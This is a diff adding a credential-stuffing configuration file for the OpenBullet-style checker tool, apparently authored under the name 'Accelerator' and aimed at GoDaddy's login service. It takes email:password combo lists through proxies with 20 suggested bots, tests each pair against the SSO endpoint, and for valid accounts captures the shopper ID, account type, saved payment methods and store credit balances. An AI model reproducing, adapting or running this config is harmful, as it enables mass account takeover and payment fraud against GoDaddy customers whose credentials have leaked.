@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "Godaddy",
+  "SuggestedBots": 20,
+  "MaxCPM": 0,
+  "LastModified": "2019-09-07T13:17:07.1507148-06:00",
+  "AdditionalInfo": "",
+  "Author": "Accelerator",
+  "Version": "1.3.9 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://sso.godaddy.com/v1/api/idp/login?regionsite=ae&realm=idp&path=%2Fproducts&app=account&marketid=en-AE" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "status\": 400" 
+  KEYCHAIN Success OR 
+    KEY "\"Ok\"," 
+
+PARSE "<COOKIES(info_cust_idp)>" LR "" "" -> VAR "auth" 
+
+FUNCTION URLDecode "<auth>" -> VAR "Cap" 
+
+PARSE "<Cap>" JSON "info_shopperId" -> CAP "id" 
+
+PARSE "<Cap>" JSON "ctype" -> CAP "Type" 
+
+REQUEST GET "https://account.godaddy.com/api/payment-methods" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "paymentMethods" -> CAP "Payment Methods" 
+
+REQUEST GET "https://account.godaddy.com/api/in-store-credits" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "beginningBalanceAmount" -> CAP "beginning Balance" 
+
+PARSE "<SOURCE>" JSON "endingBalanceAmount" -> CAP "ending Balance" 
+
